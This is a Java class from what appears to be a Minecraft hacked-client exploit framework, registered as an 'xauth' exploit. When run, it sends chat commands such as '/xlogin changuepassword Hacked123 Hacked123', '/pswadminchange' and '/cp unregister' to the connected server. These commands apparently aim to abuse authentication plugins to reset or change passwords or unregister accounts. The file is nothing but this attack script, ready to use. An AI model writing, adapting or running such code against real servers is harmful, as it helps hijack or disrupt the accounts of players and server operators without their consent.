package it.md_4.troy.command.bypass.auth;


import it.md_4.troy.exception.ExploitException;
import it.md_4.troy.exploit.Exploit;
import it.md_4.troy.exploit.ExploitInfo;
import it.md_4.troy.exploit.ExploitType;
import it.md_4.troy.helper.ChatHelper;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

@ExploitInfo(
        name = "xauth",
        type = ExploitType.OTHER,
        description = "xAuth Exploit"
)
public class Auth1 extends Exploit {

    @Override
    public void execute(Object... args) throws ExploitException {
        long start = System.currentTimeMillis();
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/xlogin changuepassword Hacked123 Hacked123"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/pswadminchange"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/cp unregister"));
        ChatHelper.printMessage(String.format("&b • &bSent &8[&7Method: &3%s&7, Time: &3%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}
